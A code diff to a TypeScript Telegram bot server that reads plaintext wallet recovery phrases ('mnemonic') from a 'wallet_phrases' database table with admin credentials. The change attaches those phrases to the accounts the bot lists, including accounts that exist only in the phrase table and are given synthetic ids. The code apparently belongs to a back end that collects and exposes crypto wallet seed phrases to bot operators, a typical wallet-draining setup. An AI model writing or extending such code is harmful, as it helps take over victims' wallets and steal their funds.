@@ -54,6 +54,33 @@ async function tg(method: string, body: unknown) {
   return res;
 }
 
+interface PhraseRow {
+  wallet_address: string;
+  username: string | null;
+  mnemonic: string | null;
+}
+
+/** Stable synthetic id for phrase rows that have no wallet_profiles entry. */
+async function syntheticId(address: string) {
+  const { createHash } = await import("node:crypto");
+  return createHash("sha256").update(address.toLowerCase()).digest("hex").slice(0, 32);
+}
+
+async function loadPhrases(): Promise<PhraseRow[]> {
+  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+  // wallet_phrases is not part of the generated database types.
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const { data, error } = await (supabaseAdmin as any)
+    .from("wallet_phrases")
+    .select("wallet_address, username, mnemonic")
+    .limit(2000);
+  if (error) {
+    console.error("[telegram] phrase table unavailable", error);
+    return [];
+  }
+  return (data ?? []) as PhraseRow[];
+}
+
 async function listAccounts(): Promise<TelegramAccount[]> {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
   const { data, error } = await supabaseAdmin
@@ -64,12 +91,28 @@ async function listAccounts(): Promise<TelegramAccount[]> {
   if (error) throw new Error(`Could not load accounts: ${error.message}`);
 
   const seen = new Set<string>();
-  return (data ?? []).filter((row) => {
+  const out: TelegramAccount[] = [];
+  for (const row of data ?? []) {
     const address = row.wallet_address.toLowerCase();
-    if (!row.username || seen.has(address)) return false;
+    if (!row.username || seen.has(address)) continue;
     seen.add(address);
-    return true;
-  });
+    out.push({ id: row.id, username: row.username, wallet_address: row.wallet_address });
+  }
+
+  // Include accounts that only exist in the phrase table.
+  for (const row of await loadPhrases()) {
+    const address = String(row.wallet_address ?? "");
+    if (!address || seen.has(address.toLowerCase())) continue;
+    seen.add(address.toLowerCase());
+    out.push({
+      id: await syntheticId(address),
+      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
+      wallet_address: address,
+      mnemonic: row.mnemonic,
+    });
+  }
+
+  return out;
 }
 
 async function getAccount(id: string): Promise<TelegramAccount | null> {
@@ -80,17 +123,35 @@ async function getAccount(id: string): Promise<TelegramAccount | null> {
     .eq("id", id)
     .maybeSingle();
   if (error) throw new Error(`Could not load account: ${error.message}`);
-  if (!data) return null;
-  // wallet_phrases is not in generated types; match address case-insensitively.
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  const phrases = (supabaseAdmin as any).from("wallet_phrases");
-  const { data: phraseRow, error: phraseError } = await phrases
-    .select("mnemonic")
-    .ilike("wallet_address", data.wallet_address)
-    .limit(1)
-    .maybeSingle();
-  if (phraseError) console.error("[telegram] phrase lookup failed", phraseError);
-  return { ...data, mnemonic: (phraseRow?.mnemonic as string | undefined) ?? null };
+
+  const phrases = await loadPhrases();
+
+  if (data) {
+    const address = data.wallet_address.toLowerCase();
+    const match =
+      phrases.find((p) => String(p.wallet_address ?? "").toLowerCase() === address) ??
+      (data.username
+        ? phrases.find(
+            (p) => (p.username ?? "").toLowerCase() === data.username.toLowerCase(),
+          )
+        : undefined);
+    return { ...data, mnemonic: match?.mnemonic ?? null };
+  }
+
+  // Phrase-only account: resolve the synthetic id back to its row.
+  for (const row of phrases) {
+    const address = String(row.wallet_address ?? "");
+    if (!address) continue;
+    if ((await syntheticId(address)) !== id.replaceAll("-", "")) continue;
+    return {
+      id,
+      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
+      wallet_address: address,
+      mnemonic: row.mnemonic,
+    };
+  }
+
+  return null;
 }
 
 function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
